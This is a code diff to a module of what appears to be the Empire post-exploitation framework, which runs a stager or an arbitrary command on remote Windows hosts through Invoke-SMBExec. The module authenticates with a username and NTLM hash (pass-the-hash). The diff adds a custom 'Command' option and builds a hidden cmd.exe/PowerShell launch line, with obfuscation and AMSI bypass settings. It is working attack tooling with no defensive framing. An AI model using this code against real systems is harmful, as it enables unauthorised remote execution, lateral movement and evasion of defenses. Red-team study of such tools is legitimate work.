@@ -15,7 +15,7 @@ class Module(object):
 
             'Author': ['@rvrsh3ll'],
 
-            'Description': ('Executes a stager on remote hosts using SMBExec.ps1'),
+            'Description': ('Executes a stager on remote hosts using SMBExec.ps1. This module requires a username and NTLM hash'),
 
             'Software': '',
 
@@ -24,7 +24,7 @@ class Module(object):
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
@@ -32,7 +32,7 @@ class Module(object):
             'Language' : 'powershell',
 
             'MinLanguageVersion' : '2',
-            
+
             'Comments': ["https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1"]
         }
 
@@ -48,7 +48,7 @@ class Module(object):
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
@@ -77,7 +77,12 @@ class Module(object):
             },
             'Listener' : {
                 'Description'   :   'Listener to use.',
-                'Required'      :   True,
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'Command' : {
+                'Description'   :   'Custom command to run.',
+                'Required'      :   False,
                 'Value'         :   ''
             },
             'Obfuscate': {
@@ -135,6 +140,7 @@ class Module(object):
         AMSIBypass2 = False
 
         listenerName = self.options['Listener']['Value']
+        command = self.options['Command']['Value']
         computerName = self.options['ComputerName']['Value']
         userName = self.options['Username']['Value']
         NTLMhash = self.options['Hash']['Value']
@@ -151,6 +157,14 @@ class Module(object):
         if (self.options['AMSIBypass2']['Value']).lower() == 'true':
             AMSIBypass2 = True
 
+        # Only "Command" or "Listener" but not both
+        if (listenerName == "" and command  == ""):
+          print(helpers.color("[!] Listener or Command required"))
+          return ""
+        if (listenerName and command):
+          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
+          return ""
+
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
@@ -163,32 +177,30 @@ class Module(object):
 
         moduleCode = f.read()
         f.close()
-
         script = moduleCode
 
-
-
-
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
             # not a valid listener, return nothing for the script
             print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
 
-        else:
-
+        elif listenerName:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
 
             if launcher == "":
                 print(helpers.color("[!] Error in launcher generation."))
                 return ""
-            else:
 
-                stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, stagerCmd)
+            Cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
+        else:
+            Cmd = '%COMSPEC% /C start /b ' + command.replace('"','\\"')
+            print(helpers.color("[*] Running command:  " + Cmd))
 
+        scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, Cmd)
         scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+
 
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
